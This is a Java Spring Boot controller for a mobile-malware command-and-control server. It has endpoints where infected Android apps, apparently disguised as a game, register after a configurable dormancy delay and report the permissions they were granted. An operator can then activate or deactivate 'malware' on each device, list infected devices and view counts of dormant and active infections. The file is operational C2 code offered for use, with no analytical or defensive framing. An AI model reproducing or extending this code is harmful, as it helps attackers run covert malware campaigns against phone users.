// controller/DeviceController.java
package com.bluewhale.controller;

import com.bluewhale.dto.DeviceRegisterRequest;
import com.bluewhale.dto.PermissionGrantRequest;
import com.bluewhale.model.Device;
import com.bluewhale.service.DeviceService;
import jakarta.validation.Valid;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;
import java.util.List;
import java.util.Map;

@RestController
@RequestMapping("/api/v1")
public class DeviceController {

    private final DeviceService deviceService;

    @Value("${app.c2.activation-delay-hours:24}")
    private int activationDelayHours;

    public DeviceController(DeviceService deviceService) {
        this.deviceService = deviceService;
    }

    /** APK registers after activation delay — POST /api/v1/register */
    @PostMapping("/register")
    public ResponseEntity<?> register(@Valid @RequestBody DeviceRegisterRequest req,
                                      @RequestHeader(value = "X-Forwarded-For", required = false) String fwd) {
        String ip = fwd != null ? fwd.split(",")[0].trim() : "unknown";
        Device d = deviceService.register(req, ip, activationDelayHours);
        return ResponseEntity.ok(Map.of(
                "status", "ok",
                "activation_delay", activationDelayHours * 3600L,
                "server_time", System.currentTimeMillis() / 1000));
    }

    /** Game UI reports permission grant — POST /api/v1/permission-granted */
    @PostMapping("/permission-granted")
    public ResponseEntity<?> permissionGranted(@Valid @RequestBody PermissionGrantRequest req) {
        deviceService.recordPermission(req);
        return ResponseEntity.ok(Map.of("status", "ok"));
    }

    /** Activate malware on a device — POST /api/v1/activate/{deviceId} */
    @PostMapping("/activate/{deviceId}")
    public ResponseEntity<?> activate(@PathVariable String deviceId) {
        deviceService.activateMalware(deviceId);
        return ResponseEntity.ok(Map.of("status", "malware_activated", "deviceId", deviceId));
    }

    /** Deactivate — POST /api/v1/deactivate/{deviceId} */
    @PostMapping("/deactivate/{deviceId}")
    public ResponseEntity<?> deactivate(@PathVariable String deviceId) {
        deviceService.deactivateMalware(deviceId);
        return ResponseEntity.ok(Map.of("status", "malware_deactivated", "deviceId", deviceId));
    }

    @GetMapping("/devices")
    public ResponseEntity<List<Device>> all() {
        return ResponseEntity.ok(deviceService.allDevices());
    }

    @GetMapping("/devices/{deviceId}")
    public ResponseEntity<Device> one(@PathVariable String deviceId) {
        return ResponseEntity.ok(deviceService.get(deviceId));
    }

    @GetMapping("/devices/active/malware")
    public ResponseEntity<List<Device>> activeMalware() {
        return ResponseEntity.ok(deviceService.malwareActiveDevices());
    }

    @GetMapping("/stats")
    public ResponseEntity<?> stats() {
        return ResponseEntity.ok(Map.of(
                "total", deviceService.allDevices().size(),
                "dormant", deviceService.countDormant(),
                "malware_active", deviceService.countMalwareActive()));
    }
}